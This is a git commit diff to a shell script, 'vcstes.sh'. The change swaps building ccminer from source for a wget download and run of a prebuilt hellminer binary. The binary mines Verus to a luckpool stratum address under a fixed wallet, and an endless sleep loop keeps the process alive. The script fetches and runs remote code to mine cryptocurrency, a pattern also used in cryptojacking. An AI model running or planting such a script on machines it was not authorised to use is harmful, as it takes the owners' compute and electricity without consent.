7222621ee86957fb76d921f26d0b5c903b34c2be
julialee654 <86806408+julialee654@users.noreply.github.com>
2021-07-03 16:39:42 -0500

    Update vcstes.sh

--- vcstes.sh
+++ vcstes.sh
@@ -1,14 +1,9 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
-./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RQwcGe5FpouQR8MaF4hEnnR1dsP1jaJFq6.anjing -p x -t 1
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RQwcGe5FpouQR8MaF4hEnnR1dsP1jaJFq6.anjing -p x --cpu 1
 while [ 1 ]; do
 sleep 3
 done
